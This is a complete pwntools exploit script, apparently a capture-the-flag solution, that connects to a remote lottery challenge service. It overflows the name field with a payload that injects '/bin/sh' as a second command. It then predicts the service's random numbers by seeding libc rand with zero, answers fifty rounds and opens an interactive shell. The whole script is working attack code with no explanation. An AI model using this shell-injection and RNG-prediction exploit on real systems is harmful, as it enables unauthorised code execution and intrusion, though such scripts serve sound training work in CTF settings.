from pwn import *
from ctypes import *

p = remote("realsung.kr", 13349)
# p = process("./sunrin_lottery")
e = ELF("./sunrin_lottery")
context.log_level = 'debug'

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(0)

payload = b''
payload = b'";/bin/sh;"'
payload += b'A' * (256 - len(payload))
payload += b'\x00' * 4

p.sendlineafter("What's your name?\n", payload)

for _ in range(50):
    p.sendlineafter("Select the number! [0-9]\n", str(libc.rand() % 10))

p.interactive()